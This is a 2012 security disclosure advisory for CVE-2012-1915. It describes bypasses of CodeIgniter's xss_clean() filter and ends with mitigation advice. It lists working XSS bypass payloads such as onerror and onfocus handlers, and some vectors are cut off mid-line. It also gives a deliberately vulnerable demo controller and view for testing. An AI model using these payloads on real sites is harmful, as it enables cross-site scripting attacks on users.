This is a security advisory for popular PHP framework - CodeIgniter.
I've found several bypasses in xss sanitization functions in the
framework. These were responsibly disclosed to the vendor and are now
fixed in version 2.1.2. (CVE-2012-1915).

Affected products
==============

CodeIgniter <= 2.1.1 PHP framework and all CodeIgniter-based PHP
applications using its built-in XSS filtering mechanism.

CVE
====

CVE-2012-1915

Introduction
==========

CodeIgniter ( http://codeigniter.com) is a powerful PHP framework with
a very small footprint, built for PHP coders who need a simple and
elegant toolkit to create full-featured web applications. CodeIgniter
comes with a Cross Site Scripting Hack prevention filter which can
either run automatically to filter all POST and COOKIE data that is
encountered, or you can run it on a per item basis. Several vectors
bypassing claimed XSS filter protections have been found in 2.1.0
version of the framework. In cooperation with vendor, these have been
fixed in version 2.1.2.

Description
=========

XSS filter of CodeIgniter framework is implemented in xss_clean()
function defined in system/core/Security.php file. It uses multiple,
mostly blacklist-oriented methods to detect and remove XSS payloads
from the passed input. As per documentation of the filter (
http://codeigniter.com/user_guide/libraries/security.html ) the filter
is supposed to be run on input passed to the application e.g. before
saving data in the database i.e. it's not an output-escaping, but
input sanitizing filter.


There are multiple ways to bypass the current version of the filters,
exemplary vectors are given below:

// Different attribute separators and invalid regexp detecting tag
closure too early

<img/src=">" onerror=alert(1)>
<button/a=">" autofocus onfocus=alert&#40;1&#40;></button>
<button a=">" autofocus onfocus=alert&#40;1&#40;>

// data: URI with base64 encoding bypass exploiting Firefox

<a target="_blank"

<a/''' target="_blank"

These exemplary bypasses may be used to cause both reflected and
stored XSS attacks depending on the way the application built with
CodeIgniter uses the input filtering mechanism.

Proof of concept
=============

Build an application on CodeIgniter 2.1.0:

// application/controllers/xssdemo.php
<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class Xssdemo extends CI_Controller {

        public function index() {
            $data['xss'] =
$this->security->xss_clean($this->input->post('xss'));
            $this->load->view('xssdemo', $data);
        }
}

// application/views/xssdemo.php
<form method=post>
                <textarea name=xss><?php echo htmlspecialchars($xss);
?></textarea>
                <input type=submit />
                </form>
        <p>XSS:
        <hr />
    <?php echo $xss ?>

Launch http://app-uri/index.php/xssdemo and try above vectors.

Mitigation
========

Upgrade to CodeIgniter >= 2.1.2. Avoid using xss-clean() function.
It's based on multiple blacklists and will therefore unavoidably be
bypassable in the future. For input filtering, use HTMLPurifier (
http://htmlpurifier.org/ ) instead.
